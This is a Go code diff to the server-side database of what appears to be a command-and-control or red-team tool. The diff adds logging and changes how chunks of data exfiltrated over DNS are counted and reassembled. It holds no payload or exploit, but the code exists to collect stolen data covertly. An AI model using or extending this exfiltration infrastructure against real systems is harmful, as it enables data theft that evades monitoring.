@@ -275,6 +275,9 @@ func (d *MasterDatabase) MarkExfilTransferComplete(req *ExfilCompletionRecord) (
 		return nil, fmt.Errorf("session_id is required")
 	}
 
+	fmt.Printf("[Master DB] Exfil completion signal for session %s (totalChunks=%d, source=%s)\n",
+		req.SessionID, req.TotalChunks, req.SourceDNS)
+
 	d.mutex.Lock()
 	defer d.mutex.Unlock()
 
@@ -303,12 +306,18 @@ func (d *MasterDatabase) MarkExfilTransferComplete(req *ExfilCompletionRecord) (
 		}
 	}
 
+	// Count actual chunks before trying to assemble
+	var actualChunks int
+	tx.QueryRow(`SELECT COUNT(DISTINCT chunk_index) FROM exfil_chunks WHERE session_id = ?`, req.SessionID).Scan(&actualChunks)
+	fmt.Printf("[Master DB] Exfil session %s has %d chunks stored (expecting %d)\n", req.SessionID, actualChunks, req.TotalChunks)
+
 	completed, err := d.tryAssembleExfilTransferTx(tx, req.SessionID)
 	if err != nil {
 		return nil, err
 	}
 
 	if !completed && req.TotalChunks > 0 {
+		fmt.Printf("[Master DB] Exfil session %s not complete yet, recording pending completion\n", req.SessionID)
 		if err = d.recordPendingExfilCompletionTx(tx, req.SessionID, req.TotalChunks); err != nil {
 			return nil, err
 		}
@@ -319,6 +328,8 @@ func (d *MasterDatabase) MarkExfilTransferComplete(req *ExfilCompletionRecord) (
         `, time.Now().Unix(), req.SessionID); err != nil {
 			return nil, err
 		}
+	} else if completed {
+		fmt.Printf("[Master DB] ✓ Exfil session %s assembled successfully\n", req.SessionID)
 	}
 
 	transfer, err := d.fetchExfilTransferTx(tx, req.SessionID)
@@ -650,12 +661,12 @@ func (d *MasterDatabase) ensureExfilTransferTx(tx *sql.Tx, sessionID, jobID, dns
 
 // tryAssembleExfilTransferTx assembles the artifact if all chunks are present.
 func (d *MasterDatabase) tryAssembleExfilTransferTx(tx *sql.Tx, sessionID string) (bool, error) {
-	var received, total int
+	var total int
 	err := tx.QueryRow(`
-        SELECT received_chunks, total_chunks
+        SELECT total_chunks
         FROM exfil_transfers
         WHERE session_id = ?
-    `, sessionID).Scan(&received, &total)
+    `, sessionID).Scan(&total)
 	if err != nil {
 		return false, err
 	}
@@ -675,7 +686,21 @@ func (d *MasterDatabase) tryAssembleExfilTransferTx(tx *sql.Tx, sessionID string
 		}
 	}
 
-	if total == 0 || received == 0 || received < total {
+	if total == 0 {
+		return false, nil
+	}
+
+	// Count actual unique chunks in exfil_chunks table (not the counter)
+	// This is more reliable with Shadow Mesh where chunks may arrive from multiple DNS servers
+	var actualChunkCount int
+	err = tx.QueryRow(`
+		SELECT COUNT(DISTINCT chunk_index) FROM exfil_chunks WHERE session_id = ?
+	`, sessionID).Scan(&actualChunkCount)
+	if err != nil {
+		return false, err
+	}
+
+	if actualChunkCount < total {
 		return false, nil
 	}
 
